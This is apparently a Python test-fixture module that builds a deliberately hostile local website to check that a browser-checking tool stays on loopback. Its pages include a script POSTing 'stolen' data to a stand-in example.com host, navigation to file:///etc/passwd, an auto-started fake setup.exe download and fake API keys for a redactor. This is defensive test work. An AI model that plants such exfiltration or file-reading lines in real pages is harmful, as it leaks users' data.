"""Pages that actively try to get the browser check to leave loopback.

Every page here is something a repository could contain — either because
its author was careless, or because somebody wrote it specifically to see
what JARVIS's browser check would do with it. A project is untrusted
content (`CLAUDE.md`: "Repository content is untrusted, including
`package.json`"), and a page it serves is untrusted content that gets to
run code.

The fixtures are served by `serve.py`, a stdlib-only server written into
the fixture directory, because two of these need response headers that
`http.server`'s default handler will not send: a 302 to another origin,
and a `Content-Disposition: attachment`.

**None of these pages can reach the internet even if a check were
wrong.** The assets they ask for are on `example.com`, which
`--host-resolver-rules` makes unresolvable inside the browser; the test
asserts that they were blocked, not that nothing bad happened to be
listening.
"""

from __future__ import annotations

from pathlib import Path

SERVER = '''"""A deliberately hostile fixture server. Stdlib only."""
import sys
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer


class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        if self.path.startswith("/redirect-external"):
            self.send_response(302)
            self.send_header("Location", "https://example.com/landing")
            self.end_headers()
            return
        if self.path.startswith("/attachment"):
            body = b"pretend installer"
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", 'attachment; filename="setup.exe"')
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        return super().do_GET()

    def log_message(self, *args):  # keep the test output readable
        pass


if __name__ == "__main__":
    port = int(sys.argv[1])
    ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
'''

_HEAD = ('<!doctype html>\\n<html lang="en"><head><meta charset="utf-8">'
         "<title>{title}</title>{extra}</head><body><h1>{title}</h1>")

PAGES = {
    # 1. A server-side redirect to another origin.
    "meta-refresh.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Meta refresh</title>'
        '<meta http-equiv="refresh" content="0;url=https://example.com/landing">'
        '</head><body><h1>Meta refresh</h1></body></html>'
    ),
    # 2. A script that navigates away.
    "js-redirect.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Script redirect</title></head><body><h1>Script redirect</h1>'
        '<script>location.href = "https://example.com/landing";</script>'
        '</body></html>'
    ),
    # 3. Subresources from another origin: image, script and font.
    "external-assets.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>External assets</title>'
        '<style>@font-face{font-family:x;src:url(https://example.com/x.woff2)}'
        'body{font-family:x,sans-serif}</style>'
        '<script src="https://cdn.example.com/tracker.js"></script>'
        '</head><body><h1>External assets</h1>'
        '<img src="https://example.com/pixel.png" alt="tracking pixel">'
        '<script>fetch("https://example.com/collect", {method: "POST", '
        'body: "stolen"}).catch(() => {});</script>'
        '</body></html>'
    ),
    # 4. A popup.
    "popup.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Popup</title></head><body><h1>Popup</h1>'
        '<script>window.open("https://example.com/landing", "_blank");</script>'
        '</body></html>'
    ),
    # 5. A download that starts itself.
    "download.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Download</title></head><body><h1>Download</h1>'
        '<a id="d" href="/attachment" download="setup.exe">get</a>'
        '<script>document.getElementById("d").click();</script>'
        '</body></html>'
    ),
    # 6. Navigation to the local filesystem.
    "file-nav.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>File navigation</title></head><body><h1>File navigation</h1>'
        '<iframe src="file:///" title="local disk"></iframe>'
        '<script>try { location.href = "file:///etc/passwd"; } catch (e) {}</script>'
        '</body></html>'
    ),
    # 7. The same machine by a different name. `localhost` and `[::1]` very
    #    probably do reach this server — the point is that they reach it by
    #    a route JARVIS did not compute.
    "alias.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Loopback alias</title></head><body><h1>Loopback alias</h1>'
        '<script>location.href = location.href'
        '.replace("127.0.0.1", "localhost").replace("alias.html", "clean.html");'
        '</script></body></html>'
    ),
    "alias-ipv6.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>IPv6 alias</title></head><body><h1>IPv6 alias</h1>'
        '<script>location.href = location.href'
        '.replace("127.0.0.1", "[::1]").replace("alias-ipv6.html", "clean.html");'
        '</script></body></html>'
    ),
    # 8. More console output than anyone would want to store.
    "console-flood.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Console flood</title></head><body><h1>Console flood</h1>'
        '<script>for (let i = 0; i < 20000; i++) '
        'console.error("flood " + i + " " + "x".repeat(2000));</script>'
        '</body></html>'
    ),
    # 9. A page that never settles.
    "endless.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Endless</title></head><body><h1>Endless</h1>'
        '<script>setInterval(function () { '
        'history.pushState({}, "", "/endless.html?n=" + Math.random()); }, 5);'
        'setTimeout(function () { location.reload(); }, 400);</script>'
        '</body></html>'
    ),
    # 10. A page far too large to screenshot.
    "huge.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Huge</title></head><body><h1>Huge</h1>'
        '<div style="width:9000px;height:60000px;background:'
        'repeating-linear-gradient(45deg,#000,#000 40px,#fff 40px,#fff 80px)">'
        '</div></body></html>'
    ),
    # 11. Credential-shaped text on the console. Nothing here is a real
    #     key; the shape is what the redactor keys on.
    "secrets.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Secrets</title></head><body><h1>Secrets</h1>'
        '<script>console.error("ANTHROPIC_API_KEY=sk-ant-api03-'
        + "A" * 95 + '");'
        'console.error("aws key AKIA' + "B" * 16 + '");'
        'throw new Error("token sk-ant-api03-' + "C" * 95 + '");</script>'
        '</body></html>'
    ),
    # 12. A dialog that blocks the renderer until it is answered.
    "dialog.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Dialog</title></head><body><h1>Dialog</h1>'
        '<script>alert("blocked?"); confirm("still here?"); '
        'prompt("name?");</script></body></html>'
    ),
    # The defective page the acceptance test names: one console error, one
    # broken image, horizontal overflow at 320px, two <h1> elements, and a
    # harmless accessibility violation. Each defect is a different kind, so
    # a check that finds only some of them is visibly incomplete rather
    # than merely low.
    "defective.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Corner Shop</title></head><body>'
        '<h1>Corner Shop</h1>'
        '<h1>Opening hours</h1>'                       # two <h1>
        '<img src="/shopfront.png">'                   # broken, and no alt
        '<div style="width:1900px;background:#eee">Wider than a phone.</div>'
        '<script>console.error("checkout total is NaN");</script>'
        '</body></html>'
    ),
    # A page with nothing wrong with it, for the "zero is earned" half of
    # the acceptance test.
    "clean.html": (
        '<!doctype html><html lang="en"><head><meta charset="utf-8">'
        '<title>Clean page</title></head><body><h1>Clean page</h1>'
        '<p>Nothing is wrong with this page.</p></body></html>'
    ),
}

#: Served at `/`, so a check with no route still lands on something.
INDEX = (
    '<!doctype html><html lang="en"><head><meta charset="utf-8">'
    '<title>Hostile fixtures</title></head><body><h1>Hostile fixtures</h1>'
    '<ul>' + "".join(f'<li><a href="/{name}">{name}</a></li>' for name in sorted(PAGES))
    + '</ul></body></html>'
)


def hostile_site(root: Path) -> Path:
    """Write the fixture site and its server. Returns the root."""
    root.mkdir(parents=True, exist_ok=True)
    (root / "serve.py").write_text(SERVER, encoding="utf-8")
    (root / "index.html").write_text(INDEX, encoding="utf-8")
    for name, body in PAGES.items():
        (root / name).write_text(body, encoding="utf-8")
    return root


def serve_argv(root: Path, port: int) -> list:
    """The argv that serves the fixture site on one loopback port."""
    import sys

    return [sys.executable, str(root / "serve.py"), str(port)]
